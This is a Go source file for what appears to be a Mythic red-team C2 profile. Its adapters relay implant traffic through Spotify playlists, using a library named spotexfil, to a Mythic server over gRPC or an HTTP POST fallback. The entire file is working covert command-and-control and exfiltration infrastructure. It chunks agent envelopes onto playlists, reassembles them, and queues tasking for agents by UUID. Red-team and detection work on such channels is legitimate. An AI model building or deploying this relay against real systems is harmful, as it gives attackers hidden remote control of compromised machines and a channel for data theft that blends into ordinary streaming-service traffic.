// Package spotify wires the pure pump bridge to the real sides:
// the spotexfil playlist transport and the Mythic gRPC push-C2 stream
// (with a poll-style HTTP POST fallback behind the same interface).
package spotify

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"sort"
	"sync"
	"time"

	mythicGRPC "github.com/MythicMeta/MythicContainer/grpc"
	"github.com/MythicMeta/MythicContainer/grpc/services"

	"github.com/sourcefrenchy/spotexfil/pkg/protocol"
	sfspotify "github.com/sourcefrenchy/spotexfil/pkg/spotify"

	"spotifycontainer/spotify/pump"
)

// ---------------------------------------------------------------------------
// Transport side: spotexfil playlist channels
// ---------------------------------------------------------------------------

// PlaylistTransport implements pump.TransportSide over the spotexfil
// Spotify client and chunking protocol.
type PlaylistTransport struct {
	client *sfspotify.Client
	key    string // transport passphrase
}

// NewPlaylistTransport builds a transport from an existing spotexfil client.
func NewPlaylistTransport(client *sfspotify.Client, passphrase string) *PlaylistTransport {
	return &PlaylistTransport{client: client, key: passphrase}
}

// ReadChannel reassembles every message on the channel, keyed by seq.
func (t *PlaylistTransport) ReadChannel(ctx context.Context, channel string) (map[int]string, error) {
	bySeq, err := t.client.ReadC2Playlists(ctx, channel, t.key, -1)
	if err != nil {
		return nil, err
	}
	out := make(map[int]string, len(bySeq))
	for seq, metas := range bySeq {
		sort.Slice(metas, func(i, j int) bool { return metas[i].Index < metas[j].Index })
		out[seq] = protocol.ReassemblePayload(metas)
	}
	return out, nil
}

// WriteChannel chunks one envelope onto the channel under the given seq.
func (t *PlaylistTransport) WriteChannel(ctx context.Context, channel string, seq int, envelopeB64 string) error {
	descs, err := protocol.ChunkPayload(envelopeB64, seq, channel, t.key)
	if err != nil {
		return fmt.Errorf("chunk envelope: %w", err)
	}
	return t.client.WriteC2Playlists(ctx, descs)
}

// CleanChannel removes the playlist(s) for one seq from the channel.
func (t *PlaylistTransport) CleanChannel(ctx context.Context, channel string, seq int) error {
	return t.client.CleanC2Playlists(ctx, channel, t.key, seq)
}

// ---------------------------------------------------------------------------
// Mythic side: gRPC push-C2 streaming
// ---------------------------------------------------------------------------

// GRPCMythic implements pump.MythicSide over the MythicContainer push-C2
// gRPC streaming service (StartPushC2StreamingOneToMany).
type GRPCMythic struct {
	stream      services.PushC2_StartPushC2StreamingOneToManyClient
	profileName string
	sendMu      sync.Mutex
}

// NewGRPCMythic dials Mythic and opens the one-to-many push stream.
// The returned adapter is tied to the lifetime of ctx: cancelling ctx
// terminates the stream.
func NewGRPCMythic(ctx context.Context, profileName string) (*GRPCMythic, error) {
	conn := mythicGRPC.GetNewPushC2ClientConnection()
	client := services.NewPushC2Client(conn)
	stream, err := client.StartPushC2StreamingOneToMany(ctx)
	if err != nil {
		return nil, fmt.Errorf("start push c2 stream: %w", err)
	}
	return &GRPCMythic{stream: stream, profileName: profileName}, nil
}

// SendToMythic forwards an agent envelope to Mythic. The envelope is sent
// as Base64Message (Mythic expects the base64 text exactly as agents emit
// it); TrackingID carries the correlation UUID.
func (g *GRPCMythic) SendToMythic(uuid string, envelopeB64 string) error {
	g.sendMu.Lock()
	defer g.sendMu.Unlock()
	return g.stream.Send(&services.PushC2MessageFromAgent{
		C2ProfileName: g.profileName,
		RemoteIP:      "",
		Base64Message: []byte(envelopeB64),
		TrackingID:    uuid,
	})
}

// RecvTasking blocks on the stream for tasking from Mythic.
func (g *GRPCMythic) RecvTasking(ctx context.Context) (string, string, error) {
	msg, err := g.stream.Recv()
	if err != nil {
		return "", "", err
	}
	if !msg.GetSuccess() {
		return "", "", fmt.Errorf("mythic reported failure: %s", msg.GetError())
	}
	return msg.GetTrackingID(), string(msg.GetMessage()), nil
}

// ---------------------------------------------------------------------------
// Mythic side: poll-style HTTP fallback
// ---------------------------------------------------------------------------
//
// Older-style C2 profiles relay messages by HTTP POSTing each agent message
// to the Mythic server (MYTHIC_ADDRESS) with a "Mythic: <profile>" header;
// the response body is the tasking to deliver back to that agent. Kept as a
// fallback behind the same pump.MythicSide interface.

// PollMythic implements pump.MythicSide via synchronous HTTP POST relay.
type PollMythic struct {
	addr        string
	profileName string
	client      *http.Client

	mu      sync.Mutex
	pending map[string][]string // uuid -> queued tasking envelopes
	notify  chan struct{}
}

// NewPollMythic creates the fallback adapter. mythicAddress is the base URL
// of the Mythic server (e.g. http://mythic:17443).
func NewPollMythic(mythicAddress, profileName string) *PollMythic {
	return &PollMythic{
		addr:        mythicAddress,
		profileName: profileName,
		client:      &http.Client{Timeout: 60 * time.Second},
		pending:     map[string][]string{},
		notify:      make(chan struct{}, 1),
	}
}

// SendToMythic POSTs the envelope to Mythic; any response body is queued as
// tasking for that agent's UUID.
func (p *PollMythic) SendToMythic(uuid string, envelopeB64 string) error {
	req, err := http.NewRequest(http.MethodPost, p.addr, bytes.NewBufferString(envelopeB64))
	if err != nil {
		return err
	}
	req.Header.Set("Mythic", p.profileName)
	resp, err := p.client.Do(req)
	if err != nil {
		return fmt.Errorf("poll POST to mythic: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("mythic returned status %d", resp.StatusCode)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read mythic response: %w", err)
	}
	if len(body) > 0 {
		p.mu.Lock()
		p.pending[uuid] = append(p.pending[uuid], string(body))
		p.mu.Unlock()
		select {
		case p.notify <- struct{}{}:
		default:
		}
	}
	return nil
}

// RecvTasking returns queued tasking, blocking until some arrives or ctx is
// cancelled. With the poll fallback, tasking only arrives as the response to
// a SendToMythic call.
func (p *PollMythic) RecvTasking(ctx context.Context) (string, string, error) {
	for {
		p.mu.Lock()
		for uuid, queue := range p.pending {
			if len(queue) == 0 {
				continue
			}
			env := queue[0]
			p.pending[uuid] = queue[1:]
			p.mu.Unlock()
			return uuid, env, nil
		}
		p.mu.Unlock()
		select {
		case <-ctx.Done():
			return "", "", ctx.Err()
		case <-p.notify:
		}
	}
}

// Compile-time checks that the adapters satisfy the pump interfaces.
var (
	_ pump.TransportSide = (*PlaylistTransport)(nil)
	_ pump.MythicSide    = (*GRPCMythic)(nil)
	_ pump.MythicSide    = (*PollMythic)(nil)
)
